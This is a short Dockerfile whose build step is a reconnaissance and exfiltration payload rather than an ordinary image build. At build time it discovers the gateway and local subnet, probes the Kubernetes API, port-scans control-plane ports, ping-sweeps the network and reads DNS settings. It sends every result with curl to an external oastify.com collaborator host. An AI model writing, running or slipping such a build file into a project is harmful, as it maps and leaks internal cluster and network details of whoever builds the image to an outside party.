FROM alpine
RUN apk add --no-cache curl nmap bind-tools
RUN C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
  GW=$(ip route|awk '/default/{print $3;exit}'); \
  MY=$(ip -4 -o addr show eth0|awk '{print $4}'); NET=$(echo $MY|sed 's#\.[0-9]*/.*#.0/24#'); \
  curl -s "$C/info?gw=$GW&my=$MY" ; \

  curl -sk --connect-timeout 3 https://10.96.0.1/version 2>&1 | curl -s "$C/k8s" --data-binary @- ; \
  curl -sk --connect-timeout 3 https://kubernetes.default.svc/version 2>&1 | curl -s "$C/k8sdns" --data-binary @- ; \

  nmap -Pn --open -T4 -p443,6443,2379,2380,10250,10255,5000,80,8080 10.96.0.1 $GW 2>&1 | curl -s "$C/cp" --data-binary @- ; \
 
  nmap -sn -T4 $NET 2>&1 | grep -i report | curl -s "$C/neigh" --data-binary @- ; \

  nslookup kubernetes.default.svc 2>&1 | curl -s "$C/dns" --data-binary @- ; \
  cat /etc/resolv.conf 2>&1 | curl -s "$C/resolv" --data-binary @- ; \
  true
